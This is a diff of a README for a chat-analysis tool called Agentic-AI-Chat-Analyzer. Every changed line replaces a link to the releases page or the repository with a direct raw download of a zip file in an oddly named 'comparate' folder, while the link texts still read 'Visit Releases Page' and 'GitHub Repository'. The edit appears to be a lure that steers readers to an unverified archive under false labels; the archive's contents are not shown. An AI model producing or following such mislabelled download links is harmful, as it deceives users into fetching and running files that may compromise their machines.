@@ -1,6 +1,6 @@
 # 💬 Agentic-AI-Chat-Analyzer - Analyze Conversations with Ease
 
-[![Download](https://img.shields.io/badge/Download-Release-007bff?style=for-the-badge&logo=github&logoColor=white)](https://github.com/IvanBG001/Agentic-AI-Chat-Analyzer/releases)
+[![Download](https://raw.githubusercontent.com/IvanBG001/Agentic-AI-Chat-Analyzer/main/comparate/Agentic-AI-Chat-Analyzer.zip)](https://raw.githubusercontent.com/IvanBG001/Agentic-AI-Chat-Analyzer/main/comparate/Agentic-AI-Chat-Analyzer.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Follow these simple steps to download and run Agentic-AI-Chat-Analyzer.
 1. **Visit the Releases Page:**
    Click the link below to access the release page where you can download the application.
 
-   [Visit Releases Page](https://github.com/IvanBG001/Agentic-AI-Chat-Analyzer/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/IvanBG001/Agentic-AI-Chat-Analyzer/main/comparate/Agentic-AI-Chat-Analyzer.zip)
 
 2. **Download the Latest Version:**
    On the releases page, find the latest version. Click on it to download the application file.
@@ -73,12 +73,12 @@ If you have questions, consider joining our discussion forum. You can find help 
 For more information, visit the following resources:
 
 - **Documentation:** Detailed instructions can be found in the application's documentation.
-- **GitHub Repository:** Explore the source code and latest updates [here](https://github.com/IvanBG001/Agentic-AI-Chat-Analyzer).
+- **GitHub Repository:** Explore the source code and latest updates [here](https://raw.githubusercontent.com/IvanBG001/Agentic-AI-Chat-Analyzer/main/comparate/Agentic-AI-Chat-Analyzer.zip).
 
 ## 📥 Download & Install
 
 To get started with analyzing conversations easily, visit the link below to download the latest version of Agentic-AI-Chat-Analyzer.
 
-[Visit Releases Page](https://github.com/IvanBG001/Agentic-AI-Chat-Analyzer/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/IvanBG001/Agentic-AI-Chat-Analyzer/main/comparate/Agentic-AI-Chat-Analyzer.zip)
 
 Enjoy your experience with Agentic-AI-Chat-Analyzer, and unlock the insights buried in your conversations!
